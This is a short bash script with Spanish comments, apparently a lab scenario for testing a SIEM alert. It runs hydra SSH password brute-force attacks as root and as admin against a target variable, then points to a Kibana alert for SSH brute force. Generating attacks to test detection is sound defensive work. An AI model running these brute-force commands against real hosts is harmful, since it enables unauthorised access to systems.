#!/usr/bin/env bash
# Escenario 1: fuerza bruta SSH con hydra.
# Primero un usuario que no existe (solo fallos) y luego admin, cuya clave está en la lista.
set -u
echo "== [$(date -u +%T)] Fuerza bruta SSH contra ${OBJETIVO}"
hydra -l root  -P /ataques/claves.txt -t 4 -I -f "ssh://${OBJETIVO}" || true
hydra -l admin -P /ataques/claves.txt -t 4 -I -f "ssh://${OBJETIVO}" || true
echo "== [$(date -u +%T)] Fin. En Kibana: Security -> Alerts -> 'SIEM - Fuerza bruta SSH'"
